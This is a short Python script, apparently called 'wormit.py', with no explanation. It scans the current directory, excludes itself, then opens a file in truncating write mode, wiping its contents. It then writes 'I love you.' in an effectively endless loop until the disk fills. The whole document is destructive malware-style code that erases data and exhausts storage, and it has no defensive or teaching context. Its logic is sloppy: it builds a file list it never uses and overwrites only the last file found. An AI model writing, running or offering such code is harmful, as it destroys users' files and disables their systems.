import os
files = []
for file in os.listdir():
  if os.path.isfile(file):
    if file == "wormit.py":
      continue
    else:
      files.append(file)
  else:
    continue
with open(file, "w+") as wf:
  for write in range(10000000000000000000000000000000000):
    wf.write("I love you.")
